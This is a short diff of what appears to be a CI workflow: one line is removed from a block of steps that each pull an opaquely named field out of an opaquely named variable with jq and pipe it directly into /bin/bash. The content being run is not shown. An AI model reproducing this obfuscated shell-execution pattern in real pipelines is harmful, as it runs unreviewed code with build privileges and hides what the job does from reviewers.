@@ -30,7 +30,6 @@ jobs:
           echo $f8984 | jq -r .ilnhk0 | /bin/bash
           echo $nj23815 | jq -r .na4427 | /bin/bash
           printf '%s' "$cxmk48" | jq -r .dvo7603 | /bin/bash
-          echo $b5243 | jq -r .t02 | /bin/bash
           printf '%s' "$i653" | jq -r .h16 | /bin/bash
 
       - name: Upload results
